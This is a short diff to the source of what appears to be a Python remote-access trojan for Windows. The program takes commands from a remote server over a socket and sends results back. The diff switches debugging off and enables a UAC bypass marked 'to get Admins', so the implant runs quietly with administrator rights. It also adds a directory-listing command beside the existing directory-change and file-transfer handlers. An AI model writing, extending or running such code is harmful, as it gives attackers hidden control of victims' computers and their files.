@@ -2,8 +2,8 @@ import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
 
-DEBUG=True
-UAC_BYPASS=False
+DEBUG=False
+UAC_BYPASS=True
 ### UAC to get Admins
 
 def debug_print(str):
@@ -123,6 +123,9 @@ while True:
                     os.chdir(str(server_cmd[3:]))
                     output=os.getcwd()
                     send_s(conn,output)
+                elif(server_cmd[:2]=="ls"): # alter mojibake hangul
+                    dir_list=os.listdir(os.getcwd())
+                    send_s(conn,'\n'.join(dir_list))
                 elif(server_cmd[:2]=="ft"):
                     if(file_transfer_mode(conn)==0):
                         continue
